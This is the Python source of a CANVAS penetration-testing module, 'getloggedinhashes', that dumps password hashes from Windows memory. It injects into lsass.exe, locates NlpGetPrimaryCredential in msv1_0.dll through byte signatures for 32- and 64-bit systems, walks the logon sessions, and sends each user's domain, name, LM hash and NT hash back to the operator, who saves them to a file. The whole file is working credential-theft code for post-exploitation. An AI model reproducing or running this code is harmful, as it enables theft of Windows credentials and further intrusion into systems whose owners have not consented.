#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os
from exploitutils import *

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

from win32MosdefShellServer import *

NAME                   = "getloggedinhashes"
DESCRIPTION            = "Get logged in hashes"

DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """

You need to be in LSASS.EXE before
running this. This means you might need to getpriv SeDebugPrivilege, and then
use processinject into lsass.exe. Don't forget you can ps and getpid if you
don't know what process you're in right now. This module will try to automatically
do this if it is not already in LSASS.EXE.

It's not working on Windows 2000.
Bindiff against XP/2k matched the function at address 0x78145898 of msv1_0.dll on 2k_sp4 but this one hasn't returned pointer to credentials.

This should work on WinXP+ 32/64bit.

"""

VERSION                = "1.0"

PROPERTY = {}
PROPERTY['TYPE']       = "Commands"
PROPERTY['SITE']       = "Local"
PROPERTY['ARCH']       = [ ["Windows"] ]


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result   = ""
        self.name     = NAME
        self.savefile = "loggedinhashes.txt"

    # set progress bar
    def set_progr(self, msg, percent):
        self.setInfo("getloggedinhashes - "+msg)
        self.setProgress(percent)

    def hashprint(self, hexhash):
        tmp = ""

        for c in hexhash:
            tmp += "%2.2x" % ord(c)

        return tmp

    def run(self):
        self.setInfo("%s"%(NAME))
        node = self.argsDict["passednodes"][0]
        self.savefile = self.argsDict.get("savefile",self.savefile)
        self.savepath = self.output(ip=node.get_interesting_interface(), subdir="PasswordHashes")

        if "win32api" in node.capabilities:
            shell = node.shell

            #JMS - slight logic refactor, we need to do our lsass.exe check
            #first or we won't get a valid connection from SamIConnect
            self.log("Testing whether we are inside lsass.exe.")
            pname = self.exploitnodes("getprocessname",nodes=[node])
            self.log("Process Name: %s" % pname)

            if "lsass" not in pname[0][0].lower():
                self.log("We need to processinject into lsass.exe to run this module. Attempting now...")

                # Just do a default mosdefmigrate and be done with it
                migrate = self.engine.getModuleExploit("mosdefmigrate")
                migrate.link(self)
                ret = migrate.run()

                if not ret:
                    self.log("Couldn't migrate, time to call it off.")
                    self.result = -1
                    return self.result
                else:
                    shell = node.shell

            ntype  = node.nodetype
            _,nodeos = shell.GetVersionEx()
            minor  = nodeos['Minor Version']
            major  = nodeos['Major Version']

            self.log('Windows version major: %s minor: %s' % (major, minor))

            ptrType        = ""
            ptrSize        = ""
            importLocation = ""
            structSize     = ""

            # *** CODE ***
            vars = {}

            if ntype == "win32Node":
                ptrType        = "long"
                ptrSize        = "4"
                importLocation = "remote"
                structSize     = "12"
                ptrSpecial     = "1"

                # XP SP2,SP3, 2003 Server Enterprise English
                # mov     edi, edi
                # push    ebp
                # mov     ebp, esp
                # sub     esp, 18h
                # and     [ebp+var_4], 0
                # push    offset aPrimary ; "Primary"

                vars["signature"] = "\x8B\xFF\x55\x8B\xEC\x83\xEC\x18\x83\x65\xFC"
                vars["signatureSize"] = 11  #len(vars["signature"])

            elif ntype == "win64Node":
                ptrType        = "long long"
                importLocation = "local"
                structSize     = "24"
                ptrSize        = "8"
                ptrSpecial     = ptrSize

                if major == 5: # WinXP/2003
                    # XP SP2 64
                    vars["signature"]     = "\x48\x8b\xc4\x48\x83\xec\x78\x48\x89\x58\x10\x48"# \x48\x10\x58\x89\x48\x18\x70\x89\x8b\x48\xf2\x8b\x78\x89\x48\xd9"
                    vars["signatureSize"] = 12

                elif major == 6: # 2008/Vista/7
                    # 7 SP1/Vista SP2 -> thx to Kostya for disassembly
                    vars["signature"]     = "\x48\x8b\xc4\x48\x89\x58\x08\x48\x89\x70\x10\x57\x48\x83\xec\x70\x83\x60\x20"
                    vars["signatureSize"] = 19

                else:
                    logging.error('Windows major version %d not supported' % major)
                    return 0
            else:
                self.log('Node type %s is not supported' % ntype)
                return 0

            code = """
            #import "IMPORT_LOCATION", "kernel32.dll|GetCurrentProcess" as "GetCurrentProcess"
            #import "IMPORT_LOCATION", "kernel32.dll|GetModuleHandleA" as "GetModuleHandleA"
            #import "IMPORT_LOCATION", "psapi.dll|GetModuleInformation" as "GetModuleInformation"
            #import "IMPORT_LOCATION", "secur32.dll|LsaEnumerateLogonSessions" as "LsaEnumerateLogonSessions"

            #import "local", "sendunistring2self" as "sendunistring2self"
            #import "local", "senddata2self" as "senddata2self"
            #import "local", "sendint" as "sendint"
            #import "local", "debug" as "debug"
            #import "local", "memcpy" as "memcpy"
            """

            if ntype == "win64Node":
                code += """
                #import "local", "call3ArgFuncPtr" as "call3ArgFuncPtr"
                #import "local", "sendlonglong" as "sendlonglong"
                """

            code +=  """
            #import "string", "signature" as "signature"
            #import "int", "signatureSize" as "signaturesize"

            struct MODULEINFO{
                PTR_TYPE lpBaseOfDll;
                int SizeOfImage;
                PTR_TYPE EntryPoint;
            };

            struct LUID{
                long LowPart;
                long HighPart;
            };

            int memcmp(char *s1, char *s2, int n) {
                unsigned char *p1;
                unsigned char *p2;
                p1 = s1;
                p2 = s2;
                int d;

                if (n){
                    while (n > 0){
                        p1 = p1 + 1;
                        p2 = p2 + 1;
                        d = *p1 - *p2;
                        if (d != 0){
                            return -1;
                        }
                        n = n - 1;
                    }
                }
                return 0;
            }

            int getNlpGetPrimaryCredentialAddr() {
                PTR_TYPE hProcess;
                PTR_TYPE hModule;
                struct MODULEINFO modinfo;

                PTR_TYPE position;
                int done;
                int found;
                PTR_TYPE absPosition;
                int imgsz;

                // Get needed handles
                hProcess = GetCurrentProcess();
                hModule = GetModuleHandleA("msv1_0.dll");

                // Get msv1_0.dll base addr and size
                int ret;
                ret = GetModuleInformation(hProcess, hModule, &modinfo, STRUCT_SIZE);
                //sendint(ret);

                // If we were successfull, iterate over all the module address space
                // looking for our function
                if (ret == 1){

                    position = 0;
                    done = 0;
                    found = 1;
            """

            if ntype == "win64Node":
                code += """
                    PTR_TYPE base;
                    base = modinfo.lpBaseOfDll;
                """

            elif ntype == "win32Node":
                code += """
                long* base;
                base  = modinfo.lpBaseOfDll;
                """

            code += """
                    imgsz  = modinfo.SizeOfImage;
                    imgsz = imgsz - signaturesize;

                    while (done == 0) {

                        absPosition = position + base;
                        found = memcmp(absPosition, signature, signaturesize);

                        position = position + 1;
                        if (position > imgsz) {
                            done = 1;
                        }

                        if (found == 0){
                            done = 1;
                        }
                    }

                    if (found == 0) {
                        return absPosition;
                    }

                    else {
                        return 0;
                    }
                }

                return 0;
            }


            void callNlpGetPrimaryCredential(PTR_TYPE *id, PTR_TYPE *ptrCreds, PTR_TYPE* fncPtr){
                PTR_TYPE *p;
                PTR_TYPE credSize;

                credSize = 0;

                p = &fncPtr;
            """

            if ntype == "win32Node":
                code += """
                *p(id, ptrCreds, credSize);
                """

            elif ntype == "win64Node":
                code += """
                call3ArgFuncPtr(*p, id, ptrCreds, credSize);
                """

            code +=  """
                return;
            }


            // Given a ptr to credential structure, sends
            // user, domain and hashes back to us
            void retrieveCredential(PTR_TYPE ptrCreds){
                PTR_TYPE *ptrDomain;
                PTR_TYPE *ptrUserName;
                PTR_TYPE ptrNThash;
                PTR_TYPE ptrLMhash;

                // Send Domain back to us
                ptrDomain = ptrCreds + 1*PTR_SIZE;
                sendunistring2self(*ptrDomain);

                // Send UserName back to us
                ptrUserName = ptrCreds + 3*PTR_SIZE;
                sendunistring2self(*ptrUserName);

                // Send nt hash
                ptrNThash = ptrCreds + 4*PTR_SIZE;
                senddata2self(ptrNThash, 16);

                // Send LMhash
                ptrLMhash = ptrCreds + 8*PTR_SIZE;
                senddata2self(ptrLMhash, 16);

            }


            void main()
            {
                long logonSessionCount;

            """

            if ntype == "win32Node":
                code += """
                struct LUID *logonSessionList;
                long ptrCreds;
                """

            elif ntype == "win64Node":
                code += """
                PTR_TYPE logonSessionList;
                PTR_TYPE ptrCreds;
                """

            code += """
                int curSess;
                PTR_TYPE fncPtr;
                curSess = 0;
                int index;
                struct LUID logonSession;

                // Enumerate active sessions
                LsaEnumerateLogonSessions(&logonSessionCount, &logonSessionList);
                sendint(logonSessionCount);

                // Find THE function we need
                fncPtr = getNlpGetPrimaryCredentialAddr();
                """

            if ntype == "win32Node":
                code += """
                sendint(fncPtr);
                """
            elif ntype == "win64Node":
                code += """
                sendlonglong(fncPtr);
                """

            code += """
                // We don't want to crash lsass :)
                if (fncPtr != 0){

                    // go and retrieve the hashes
                    while (curSess < logonSessionCount){
                        index = logonSessionList + curSess*PTR_SPECIAL;
                        //LUID always 8 bytes
                        memcpy(&logonSession,index,8);

                        ptrCreds = 0;
                        callNlpGetPrimaryCredential(&logonSession, &ptrCreds, fncPtr);

                        sendint(ptrCreds);

                        if (ptrCreds != 0){
                            retrieveCredential(ptrCreds);
                        }

                        curSess = curSess + 1;
                    }

                    // OK
                    sendint(1);

                }
                else{
                    // FAIL
                    sendint(0);
                }
            }
            """

            code = code.replace("IMPORT_LOCATION", importLocation)
            code = code.replace("PTR_TYPE", ptrType)
            code = code.replace("PTR_SIZE", ptrSize)
            code = code.replace("STRUCT_SIZE", structSize)
            code = code.replace("PTR_SPECIAL", ptrSpecial)
            shell.clearfunctioncache()
            request=shell.compile(code,vars)
            shell.sendrequest(request)

            count = shell.readint()
            self.log("Got %d sessions" % count)
            self.log("User:Domain:LMhash:NThash")

            if ntype == "win32Node":
                fncPtr = shell.readint()
            elif ntype == "win64Node":
                fncPtr = shell.readlonglong()

            self.log('FuncPtr: 0x%x' % fncPtr)

            user_list = ""
            if (fncPtr != 0):
                self.log("Found NlpGetPrimaryCredential at 0x%x" % fncPtr)

                for i in range(count):
                    ptrCreds = shell.readint()
                    if (ptrCreds != 0):
                        domain     = node.shell.readblock()
                        user       = node.shell.readblock()
                        NThash     = node.shell.readblock()
                        LMhash     = node.shell.readblock()
                        user_entry = "%s:%s:%s:%s\n" % (user.decode('utf-16le'), domain.decode('utf-16le'), self.hashprint(LMhash), cleanhexprint(NThash))
                        self.log(user_entry)
                        user_list += user_entry
            else:
                self.log("Could not find NlpGetPrimaryCredential.")


            ret = shell.readint()
            shell.leave()

            if ret:
                # Log it to the file
                save_loc=os.path.join(self.savepath, self.savefile)

                fd = open(save_loc,"a")
                fd.write(user_list)
                fd.close()
                #XXX: Todo: Add reporting call here!
                self.log("Saved logged in password hashes to: %s" % save_loc)

        else:
            self.log("%s node type not supported"%node.nodetype)
            return 0

        self.setInfo("%s - done (success: %s)"%(NAME,self.result))
        return ret

if __name__=="__main__":
    print "This is an exploit that should be used only from within CANVAS"
